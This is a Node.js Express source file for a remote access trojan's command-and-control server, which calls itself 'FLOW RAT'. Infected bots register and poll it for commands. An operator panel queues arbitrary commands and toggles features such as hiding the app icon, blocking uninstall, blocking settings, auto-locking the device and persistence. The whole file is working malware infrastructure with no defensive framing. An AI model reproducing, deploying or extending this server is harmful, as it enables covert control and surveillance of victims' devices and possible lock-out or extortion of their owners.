const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

const PORT = process.env.PORT || 3000;
const HOST = '0.0.0.0';
const AUTH_TOKEN = process.env.AUTH_TOKEN || 'flow-secret-token-2026';

// ====== STORAGE (in-memory) ======
const bots = {};       // { bot_id: { info, ip, last_seen, commands: [], last_result, features: {} } }
const pendingToggles = {}; // { bot_id: { feature: bool } }

// Feature list valid
const VALID_FEATURES = ['anti_uninstall', 'block_settings', 'autolock', 'pin_app', 'hide_icon', 'persist'];

// ====== MIDDLEWARE AUTH ======
function requireAuth(req, res, next) {
    const token = req.headers['x-auth-token'] || req.query.token;
    if (token !== AUTH_TOKEN) {
        return res.status(401).json({ error: 'unauthorized' });
    }
    next();
}

// ====== HEALTH ======
app.get('/', (req, res) => {
    res.json({
        status: 'FLOW RAT Server Running',
        time: new Date().toISOString(),
        bots_total: Object.keys(bots).length,
        version: '1.1.0',
        port: PORT
    });
});

// ====== BOT REGISTER ======
app.post('/rat/register', (req, res) => {
    const { bot_id, info, features } = req.body;
    if (!bot_id) return res.status(400).json({ error: 'bot_id required' });

    if (!bots[bot_id]) {
        bots[bot_id] = { commands: [], last_result: null, features: {} };
    }
    bots[bot_id].info = info || '-';
    bots[bot_id].last_seen = new Date().toISOString();
    bots[bot_id].ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-';

    // Sync feature state dari bot (bot = source of truth)
    if (features && typeof features === 'object') {
        bots[bot_id].features = features;
    } else {
        // Default semua OFF
        if (Object.keys(bots[bot_id].features).length === 0) {
            VALID_FEATURES.forEach(f => bots[bot_id].features[f] = false);
        }
    }

    // Apply pending toggles kalau ada (bot baru online)
    if (pendingToggles[bot_id]) {
        Object.keys(pendingToggles[bot_id]).forEach(f => {
            bots[bot_id].commands.push({
                id: Date.now() + Math.random(),
                cmd: 'toggle',
                arg: f + ':' + (pendingToggles[bot_id][f] ? 'on' : 'off'),
                created: new Date().toISOString()
            });
        });
        delete pendingToggles[bot_id];
    }

    console.log(`[BOT] register: ${bot_id} | ${info}`);
    res.json({ status: 'ok', bot_id, features: bots[bot_id].features });
});

// ====== BOT POLL ======
app.get('/rat/poll/:bot_id', (req, res) => {
    const { bot_id } = req.params;
    if (!bots[bot_id]) return res.json({});

    bots[bot_id].last_seen = new Date().toISOString();
    const cmd = bots[bot_id].commands.shift();
    res.json(cmd || {});
});

// ====== BOT SEND RESULT ======
app.post('/rat/result', (req, res) => {
    const { bot_id, result, cmd_id } = req.body;
    if (bots[bot_id]) {
        bots[bot_id].last_result = {
            cmd_id: cmd_id || null,
            result: result || '',
            time: new Date().toISOString()
        };
        console.log(`[BOT] result from ${bot_id}: ${result}`);
    }
    res.json({ status: 'ok' });
});

// ====== BOT REPORT FEATURE STATE ======
app.post('/rat/report-state', (req, res) => {
    const { bot_id, features } = req.body;
    if (!bot_id) return res.status(400).json({ error: 'bot_id required' });

    if (!bots[bot_id]) {
        bots[bot_id] = { commands: [], last_result: null, features: {}, info: '-', last_seen: '-' };
    }
    if (features && typeof features === 'object') {
        bots[bot_id].features = features;
    }
    bots[bot_id].last_seen = new Date().toISOString();

    res.json({ status: 'ok', features: bots[bot_id].features });
});

// ====== PANEL TOGGLE FEATURE ======
app.post('/rat/toggle', requireAuth, (req, res) => {
    const { bot_id, feature, value } = req.body;

    if (!bot_id || !feature) {
        return res.status(400).json({ error: 'bot_id & feature required' });
    }
    if (!VALID_FEATURES.includes(feature)) {
        return res.status(400).json({ error: 'invalid feature', valid: VALID_FEATURES });
    }

    const on = !!value;

    if (!bots[bot_id]) {
        // Bot belum pernah register — simpan pending
        if (!pendingToggles[bot_id]) pendingToggles[bot_id] = {};
        pendingToggles[bot_id][feature] = on;
        return res.json({ status: 'pending', bot_id, feature, value: on, note: 'bot offline, toggle disimpan sebagai pending' });
    }

    const isOnline = bots[bot_id].last_seen && (Date.now() - new Date(bots[bot_id].last_seen).getTime()) < 60000;

    // Update state di server
    bots[bot_id].features[feature] = on;

    if (isOnline) {
        // Kirim command ke bot
        bots[bot_id].commands.push({
            id: Date.now() + Math.random(),
            cmd: 'toggle',
            arg: feature + ':' + (on ? 'on' : 'off'),
            created: new Date().toISOString()
        });
        console.log(`[TOGGLE] ${bot_id} → ${feature}:${on ? 'on' : 'off'}`);
        res.json({ status: 'queued', bot_id, feature, value: on });
    } else {
        // Bot offline — simpan pending
        if (!pendingToggles[bot_id]) pendingToggles[bot_id] = {};
        pendingToggles[bot_id][feature] = on;
        res.json({ status: 'pending', bot_id, feature, value: on, note: 'bot offline, toggle disimpan' });
    }
});

// ====== PANEL GET AGENT STATE ======
app.get('/rat/agent-state/:bot_id', requireAuth, (req, res) => {
    const { bot_id } = req.params;
    if (!bots[bot_id]) {
        return res.json({ features: {}, pending: pendingToggles[bot_id] || null });
    }
    res.json({
        features: bots[bot_id].features || {},
        pending: pendingToggles[bot_id] || null
    });
});

// ====== PANEL SEND COMMAND (AUTH) ======
app.post('/rat/command', requireAuth, (req, res) => {
    const { bot_id, command, arg } = req.body;
    if (!bot_id || !command) {
        return res.status(400).json({ error: 'bot_id & command required' });
    }

    if (!bots[bot_id]) {
        bots[bot_id] = { commands: [], last_result: null, info: '-', last_seen: '-', features: {} };
        VALID_FEATURES.forEach(f => bots[bot_id].features[f] = false);
    }

    bots[bot_id].commands.push({
        id: Date.now(),
        cmd: command,
        arg: arg || '',
        created: new Date().toISOString()
    });

    console.log(`[CMD] ${command} → ${bot_id}${arg ? ' | ' + arg : ''}`);
    res.json({ status: 'queued', bot_id, command });
});

// ====== PANEL LIST BOTS (AUTH) ======
app.get('/rat/bots', requireAuth, (req, res) => {
    const list = Object.keys(bots).map(id => {
        const b = bots[id];
        const isOnline = b.last_seen && (Date.now() - new Date(b.last_seen).getTime()) < 60000;
        return {
            id,
            info: b.info,
            ip: b.ip,
            last_seen: b.last_seen,
            last_result: b.last_result,
            pending: b.commands.length,
            features: b.features || {},
            status: isOnline ? 'online' : 'offline'
        };
    });
    res.json({ bots: list, total: list.length });
});

// ====== PANEL GET RESULT (AUTH) ======
app.get('/rat/result/:bot_id', requireAuth, (req, res) => {
    const { bot_id } = req.params;
    if (!bots[bot_id]) return res.json({ result: null });
    res.json({ result: bots[bot_id].last_result });
});

// ====== DELETE BOT (AUTH) ======
app.delete('/rat/bot/:bot_id', requireAuth, (req, res) => {
    const { bot_id } = req.params;
    delete bots[bot_id];
    delete pendingToggles[bot_id];
    res.json({ status: 'deleted' });
});

// ====== CLEAR QUEUE (AUTH) ======
app.delete('/rat/queue/:bot_id', requireAuth, (req, res) => {
    const { bot_id } = req.params;
    if (bots[bot_id]) bots[bot_id].commands = [];
    res.json({ status: 'cleared' });
});

// ====== 404 ======
app.use((req, res) => {
    res.status(404).json({ error: 'not found', path: req.path });
});

// ====== START ======
app.listen(PORT, HOST, () => {
    console.log(`[FLOW RAT] Server running on http://${HOST}:${PORT}`);
    console.log(`[FLOW RAT] Auth token: ${AUTH_TOKEN}`);
    console.log(`[FLOW RAT] Ready to accept connections`);
});
